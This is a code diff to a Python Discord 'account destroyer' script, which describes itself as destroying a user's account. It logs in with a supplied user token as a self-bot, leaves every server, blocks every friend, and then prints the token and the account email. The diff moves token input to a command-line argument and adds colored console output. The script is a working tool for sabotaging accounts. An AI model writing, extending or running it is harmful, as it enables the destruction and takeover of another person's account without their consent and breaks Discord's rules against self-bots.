@@ -1,7 +1,11 @@
 import discord
 from discord.ext import commands 
 import os
-
+import argparse
+import time
+import colorama
+from colorama import Fore, Back, init
+init()
 def clear():
 	if os.name != 'nt':
 		os.system('clear')
@@ -10,9 +14,9 @@ def clear():
 
 client = commands.Bot(command_prefix='')
 
-token = input('Enter token to destroy: ')
-
-
+parser = argparse.ArgumentParser(description='Destroys a user\'s Discord account.')
+parser.add_argument('-t', action='store', dest="token", help='users token', type=str, required=True)
+args = parser.parse_args()
 
 @client.event 
 async def on_connect():
@@ -23,23 +27,24 @@ async def on_connect():
 	for guild in client.guilds:
 		try:
 			await guild.leave()
-			print('Successfully left ' + guild.name)
+			print(Fore.LIGHTGREEN_EX + 'Successfully left ' + guild.name + Fore.RESET)
 		except:
-			print('Failed to leave ' + guild.name)
+			print(Fore.LIGHTRED_EX + 'Failed to leave ' + guild.name + Fore.RESET)
 			pass
 	for friend in client.user.friends:
 		try:
 			await friend.block()
-			print('Blocked ' + str(friend))
+			print(Fore.LIGHTGREEN_EX + 'Blocked ' + str(friend) + Fore.RESET)
 		except Exception as e:
-			print('Failed to block ' + str(friend) + '. The reason is ' + str(e))
+			print(Fore.LIGHTRED_EX + 'Failed to block ' + str(friend) + '. The reason is ' + str(e) + Fore.RESET)
+	time.sleep(5)
 	clear()
-	print('Discord account successfully destroyed!')
-	print('Token: ' + token)
+	print(Fore.LIGHTGREEN_EX + 'Discord account successfully destroyed!' + Fore.RESET)
+	print('Token: ' + args.token)
 	print('Email: ' + client.user.email)
 
 @client.event
 async def on_command_error(ctx, error):
 	pass
 
-client.run(token, bot=False)
+client.run(args.token, bot=False)
